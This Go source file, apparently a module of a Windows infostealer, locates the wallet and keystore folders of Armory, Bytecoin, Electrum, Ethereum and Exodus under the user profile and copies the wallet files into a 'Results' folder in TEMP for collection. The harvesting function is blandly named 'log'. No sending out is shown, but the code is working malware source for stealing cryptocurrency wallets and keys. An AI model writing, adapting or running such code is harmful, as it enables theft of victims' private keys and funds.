package crypto

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/equisde/Clean/utils"
)

func log(name, path, searchQuery string) {
	var tempEPath = userPath + path
	files, err := ioutil.ReadDir(tempEPath) // os.ReadDir is better, but we need cross compatibility
	if err != nil {
		return
	}

	var exodusPath = tempPath + "\\" + name
	if os.Mkdir(exodusPath, 0666) != nil {
		return
	}

	for _, file := range files {
		if len(searchQuery) > 0 && !strings.HasSuffix(file.Name(), searchQuery) {
			continue
		}

		utils.CopyFile(utils.CleanPath(exodusPath+"\\"+file.Name()), tempEPath+"\\"+file.Name())
	}
}

func LogCrypto() {
	for name, data := range paths {
		log(name, data.Path, data.Query)
	}
}

var (
	paths = map[string]struct {
		Path  string
		Query string
	}{
		"Armory": { // the canadian in me wants to change this to Armoury very bad
			Path:  "\\AppData\\Roaming\\Armory",
			Query: "wallet",
		},
		"Bytecoin": {
			Path:  "\\AppData\\Roaming\\Bytecoin",
			Query: "wallet",
		},
		"Electrum": {
			Path: "\\AppData\\Roaming\\Electrum\\wallets",
		},
		"Ethereum": {
			Path: "\\AppData\\Roaming\\Ethereum\\keystore",
		},
		"Exodus": {
			Path: "\\AppData\\Roaming\\Exodus\\exodus.wallet",
		},
	}
	tempPath = utils.CleanPath(filepath.Join(os.Getenv("TEMP"), "Results"))
	userPath = os.Getenv("USERPROFILE")
)
